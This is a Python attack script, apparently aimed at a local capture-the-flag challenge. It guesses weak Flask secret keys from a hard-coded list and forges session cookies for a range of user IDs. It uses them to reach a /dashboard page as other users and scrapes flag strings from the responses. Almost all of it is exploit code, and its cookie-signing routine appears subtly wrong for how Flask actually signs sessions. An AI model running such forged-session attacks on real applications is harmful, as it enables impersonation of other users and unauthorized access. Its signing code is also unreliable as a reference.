import requests
import json
import base64
import hmac
import hashlib

BASE_URL = "http://127.0.0.1:32943"
ORIGINAL_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.aVLcqQ.GOiO-YgoHJypd9IrAVxUQ6Bol_s"
SECRETS = ['secret','flask-secret','dev','development','test','testing','changeme','password','123456','abcdef','abc123']
USER_IDS = range(10030, 10041)

def decode_payload(cookie_str):
    try:
        payload = cookie_str.split('.')[0]
        padding = 4 - len(payload) % 4
        if padding != 4:
            payload += '=' * padding
        return json.loads(base64.urlsafe_b64decode(payload))
    except:
        return None

def make_cookie(user_id, secret):
    try:
        payload = base64.urlsafe_b64encode(json.dumps({"user_id": user_id}).encode()).decode().rstrip('=')
        timestamp = "aVLcqQ"  # Using original timestamp
        data = f"{payload}.{timestamp}"
        sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), data.encode(), hashlib.sha256).digest()).decode().rstrip('=')
        return f"{data}.{sig}"
    except:
        return None

print("Flask Cookie IDOR Test")
print("=" * 50)

# Test baseline authentication
print("\n[1] Testing authentication...")
try:
    r = requests.post(f"{BASE_URL}/", data={'username': 'test', 'password': 'test'}, timeout=10, allow_redirects=False)
    if r.cookies.get('session'):
        session_cookie = r.cookies.get('session')
    else:
        session_cookie = ORIGINAL_COOKIE
except Exception as e:
    print(f"Auth error: {e}")
    session_cookie = ORIGINAL_COOKIE

orig_data = decode_payload(session_cookie)
print(f"Original cookie: {orig_data}")

# Main testing loop
found_flags = []
working_access = []

print("\n[2] Testing secrets and user IDs...")
for secret in SECRETS:
    print(f"\nTesting secret: '{secret}'")
    for uid in USER_IDS:
        cookie = make_cookie(uid, secret)
        if not cookie:
            continue
        try:
            headers = {'X-UserId': str(uid)}
            r = requests.get(f"{BASE_URL}/dashboard", cookies={'session': cookie}, headers=headers, timeout=5)
            
            if 'FLAG{' in r.text:
                import re
                flags = re.findall(r'FLAG\{[^}]+\}', r.text)
                for flag in flags:
                    found_flags.append((flag, secret, uid))
                    print(f"  [!] FLAG: {flag}")
            
            if r.status_code == 200:
                working_access.append((uid, secret))
                print(f"  [+] UID {uid} - OK ({len(r.text)}B)")
            elif r.status_code == 403:
                print(f"  [-] UID {uid} - Denied")
            else:
                print(f"  [?] UID {uid} - Status {r.status_code}")
        except Exception as e:
            print(f"  [-] UID {uid} - Error: {str(e)[:30]}")

print("\n" + "=" * 50)
print("RESULTS")
print("=" * 50)

if found_flags:
    print("\n[!] FLAGS FOUND:")
    for flag, secret, uid in found_flags:
        print(f"  {flag} (secret: '{secret}', user_id: {uid})")

if working_access:
    print("\n[+] ACCESSIBLE USER IDs:")
    for uid, secret in working_access:
        print(f"  User ID {uid} (via secret: '{secret}')")

print(f"\n[*] Total flags: {len(found_flags)}")
print(f"[*] Total accessible users: {len(working_access)}")

if not found_flags and not working_access:
    print("[-] No flags or accessible users found")

print("\n[3] Debug info:")
print(f"    Original cookie structure: {orig_data}")
if working_access:
    test_uid, test_secret = working_access[0]
    test_cookie = make_cookie(test_uid, test_secret)
    print(f"    Modified cookie example: {test_cookie[:50]}...")

